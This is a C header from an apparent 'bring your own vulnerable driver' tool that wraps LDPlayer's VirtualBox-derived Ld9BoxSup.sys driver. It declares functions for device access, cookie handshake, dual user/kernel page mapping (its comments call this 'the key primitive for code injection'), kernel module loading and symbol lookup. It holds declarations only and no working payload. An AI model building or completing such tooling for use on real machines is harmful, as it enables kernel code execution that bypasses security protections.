/**
 * @file supdrv.h
 * @brief Ld9BoxSup.sys (VirtualBox SUPDrv) interface
 *
 * C port from C++ reference implementation.
 *
 * Key capabilities:
 * - Cookie handshake with version negotiation
 * - PageAllocEx for dual R3/R0 memory mapping
 * - LDR_OPEN/LDR_LOAD for kernel code loading
 * - MSR read/write (disabled in LDPlayer - returns -12)
 */

#ifndef BYOVD_SUPDRV_H
#define BYOVD_SUPDRV_H

#include "types.h"
#include "supdrv_types.h"

//=============================================================================
// SUPDrv Context Structure
//=============================================================================

typedef struct _SUPDRV_CTX {
    HANDLE   hDevice;               // Device handle
    UINT32   Cookie;                // Session cookie from handshake
    UINT32   SessionCookie;         // Session-specific cookie
    UINT64   pSession;              // Kernel session pointer
    UINT32   DetectedVersion;       // Detected driver version
    bool     bInitialized;          // Session established
    wchar_t  wszDeviceName[64];     // Device path that worked
    char     szLastError[256];      // Last error message
} SUPDRV_CTX, *PSUPDRV_CTX;

//=============================================================================
// Initialization / Cleanup
//=============================================================================

/**
 * Initialize SUPDrv context
 * @param ctx Context to initialize
 */
void SupDrv_Init(PSUPDRV_CTX ctx);

/**
 * Cleanup SUPDrv context
 * @param ctx Context to cleanup
 */
void SupDrv_Cleanup(PSUPDRV_CTX ctx);

/**
 * Initialize session with device handle
 * Opens device using NtCreateFile and performs cookie handshake.
 *
 * @param ctx Context
 * @return true on success
 */
bool SupDrv_Initialize(PSUPDRV_CTX ctx);

/**
 * Check if context is initialized
 * @param ctx Context
 * @return true if session is established
 */
bool SupDrv_IsInitialized(PSUPDRV_CTX ctx);

/**
 * Get last error message
 * @param ctx Context
 * @return Error message string
 */
const char* SupDrv_GetLastError(PSUPDRV_CTX ctx);

//=============================================================================
// Device Opening
//=============================================================================

/**
 * Try to open the SUPDrv device
 * Tries multiple device paths (Ld9BoxDrv, Ld9BoxDrvU, VBoxDrv).
 * USES NtCreateFile - required because driver has no DOS symlink!
 *
 * @param ctx Context (output: hDevice, wszDeviceName)
 * @return true if device opened
 */
bool SupDrv_TryOpenDevice(PSUPDRV_CTX ctx);

//=============================================================================
// Cookie Handshake
//=============================================================================

/**
 * Probe driver version and acquire session cookies
 * Tries known versions until one works.
 *
 * @param ctx Context (must have hDevice set)
 * @return true if cookie acquired
 */
bool SupDrv_ProbeVersion(PSUPDRV_CTX ctx);

/**
 * Try cookie handshake with specific version
 *
 * @param ctx Context
 * @param u32Version Version to try
 * @return true if handshake succeeded
 */
bool SupDrv_TryCookie(PSUPDRV_CTX ctx, UINT32 u32Version);

//=============================================================================
// Memory Allocation
//=============================================================================

/**
 * Allocate pages with dual R3/R0 mapping
 *
 * This is the key primitive for code injection:
 * - Write code to pvR3 (usermode writable)
 * - Execute via pvR0 (kernel executable)
 *
 * @param ctx Context
 * @param cPages Number of 4KB pages
 * @param ppvR3 Output: Ring-3 mapping (usermode writable)
 * @param ppvR0 Output: Ring-0 mapping (kernel executable)
 * @return true on success
 */
bool SupDrv_PageAllocEx(PSUPDRV_CTX ctx, UINT32 cPages, void** ppvR3, void** ppvR0);

/**
 * Free pages allocated by PageAllocEx
 *
 * @param ctx Context
 * @param pvR3 Ring-3 address from PageAllocEx
 * @return true on success
 */
bool SupDrv_PageFree(PSUPDRV_CTX ctx, void* pvR3);

//=============================================================================
// Module Loading (LDR_OPEN / LDR_LOAD)
//=============================================================================

/**
 * Open a module for loading (LDR_OPEN)
 * Allocates kernel memory for the module.
 *
 * @param ctx Context
 * @param cbImage Size of image to load
 * @param ppvImageBase Output: Kernel address for image
 * @return true on success
 */
bool SupDrv_LdrOpen(PSUPDRV_CTX ctx, UINT32 cbImage, void** ppvImageBase);

/**
 * Load module into kernel (LDR_LOAD)
 * Copies image and optionally calls entry point.
 *
 * @param ctx Context
 * @param pvImageBase Kernel address from LdrOpen
 * @param pvImage Image data to load
 * @param cbImage Size of image
 * @param pfnEntry Entry point to call (or NULL)
 * @return true on success
 */
bool SupDrv_LdrLoad(PSUPDRV_CTX ctx, void* pvImageBase, const void* pvImage,
                    UINT32 cbImage, void* pfnEntry);

//=============================================================================
// MSR Access (DISABLED in LDPlayer - returns VERR_NOT_SUPPORTED)
//=============================================================================

/**
 * Read MSR value
 * NOTE: Returns false with rc=-12 on LDPlayer (MSR_PROBER disabled)
 *
 * @param ctx Context
 * @param uMsr MSR number
 * @param puValue Output: MSR value
 * @param idCpu Target CPU (UINT32_MAX for any)
 * @return true on success, false if disabled
 */
bool SupDrv_MsrRead(PSUPDRV_CTX ctx, UINT32 uMsr, UINT64* puValue, UINT32 idCpu);

/**
 * Write MSR value
 * NOTE: Returns false with rc=-12 on LDPlayer (MSR_PROBER disabled)
 *
 * @param ctx Context
 * @param uMsr MSR number
 * @param uValue Value to write
 * @param idCpu Target CPU (UINT32_MAX for any)
 * @return true on success, false if disabled
 */
bool SupDrv_MsrWrite(PSUPDRV_CTX ctx, UINT32 uMsr, UINT64 uValue, UINT32 idCpu);

//=============================================================================
// Symbol Resolution (LDR_GET_SYMBOL)
//=============================================================================

/**
 * Resolve kernel symbol address
 *
 * @param ctx Context
 * @param szSymbol Symbol name (e.g., "MmGetSystemRoutineAddress")
 * @param ppvSymbol Output: Symbol address in kernel
 * @return true on success
 */
bool SupDrv_GetSymbol(PSUPDRV_CTX ctx, const char* szSymbol, void** ppvSymbol);

//=============================================================================
// IOCTL Helpers
//=============================================================================

/**
 * Send IOCTL to driver
 *
 * @param ctx Context
 * @param dwIoctl IOCTL code
 * @param pIn Input buffer
 * @param cbIn Input size
 * @param pOut Output buffer
 * @param cbOut Output size
 * @return true if DeviceIoControl succeeded
 */
bool SupDrv_DoIoctl(PSUPDRV_CTX ctx, DWORD dwIoctl,
                    void* pIn, UINT32 cbIn,
                    void* pOut, UINT32 cbOut);

/**
 * Fill request header with session cookies
 *
 * @param ctx Context
 * @param pHdr Header to fill
 * @param cbIn Input size for this request
 * @param cbOut Output size for this request
 */
void SupDrv_FillHeader(PSUPDRV_CTX ctx, PSUPREQHDR pHdr, UINT32 cbIn, UINT32 cbOut);

#endif // BYOVD_SUPDRV_H
